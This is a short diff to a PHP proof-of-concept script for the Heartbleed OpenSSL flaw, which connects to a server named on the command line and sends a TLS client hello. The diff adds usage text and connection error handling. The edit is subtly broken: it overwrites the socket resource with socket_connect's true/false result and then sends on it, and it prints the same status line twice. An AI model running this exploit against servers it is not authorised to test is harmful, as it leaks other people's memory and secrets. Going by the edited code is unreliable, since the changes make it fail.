@@ -11,8 +11,8 @@
 **/
 echo "--------PHP Heartbleed POC ---------------\n\n";
 ob_start();
-if( 0 == $argc )
-	exit("I need a server to test!");
+if( 1 == $argc )
+	exit("Usage: \"php ssltest.php url.com 443\"");
 array_shift($argv);
 $data = array(
 		$argv[0],
@@ -131,7 +131,10 @@ function hit_hb() {
 	}
 }
 echo "Connecting to socket...\n";
-socket_connect( $s, $data[0], $data[1] );
+$s = socket_connect( $s, $data[0], $data[1] );
+if( ! $s )
+	exit("Error [". socket_last_error() . "]: " . socket_strerror( socket_last_error() ) );
+echo "Sending client hello...\n";
 echo "Sending client hello...\n";
 socket_send($s, $hello, strlen($hello), 0 );
 ob_flush();
